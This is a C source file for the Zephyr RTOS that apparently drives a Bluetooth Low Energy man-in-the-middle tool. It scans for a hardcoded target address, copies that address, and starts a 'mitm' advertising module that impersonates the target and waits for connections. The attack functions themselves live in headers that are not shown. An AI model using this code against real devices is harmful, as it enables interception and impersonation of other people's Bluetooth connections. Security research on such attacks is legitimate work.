/*
 * Copyright (c) 2022 Nordic Semiconductor ASA
 *
 * SPDX-License-Identifier: Apache-2.0
 */
#include <zephyr/bluetooth/bluetooth.h>
#include "observer.h"
#include "mitm.h"
#include <zephyr/logging/log.h>
#include <zephyr/kernel.h>
#include<zephyr/bluetooth/hci.h>
#include<zephyr/bluetooth/buf.h>
#include"adv.h"

LOG_MODULE_REGISTER(log1, LOG_LEVEL_DBG);

void main(void)
{
	int err;

	LOG_INF("Starting Observer Demo\n");

	my_init_mitm();

	/* Initialize the Bluetooth Subsystem */
	err = bt_enable(NULL);
	if (err) {
		LOG_ERR("Bluetooth init failed (err %d)\n", err);
		return;
	}

	err = observer_start();
	if (err){
		LOG_ERR("Bluetooth observer failed (err %d)\n", err);
		return;
	}

	err = set_my_target("F7:E1:36:7C:5B:AB","random");


	LOG_INF("waiting for sema");

	k_sem_take(&target_sem, K_FOREVER);
	
	LOG_INF("stopping scanning");
	err = bt_le_scan_stop();
	if (err)
	{
		LOG_ERR("Bluetooth stop scanning failed (err %d)\n", err);
		return;
	}

	struct bt_hci_cp_le_set_random_address _bt_le_address = {
		.bdaddr = target_mitm_info.addr.a,
	};
	
	/*MY_MAN_BUF*/
	LOG_INF("attempting to start mitm module and advertisment\n");
	err = my_mitm_start_ad();

	if (err)
	{
		LOG_ERR("failing to activate mitm module (err %d)\n", err);
		return;
	}

	LOG_INF("MITM module started waiting for connections ...\n");
	bool loop = true;
	while(loop){
		k_sem_take(&adv_sem, K_FOREVER);
	}

	LOG_INF("Exiting %s thread.\n", __func__);
}
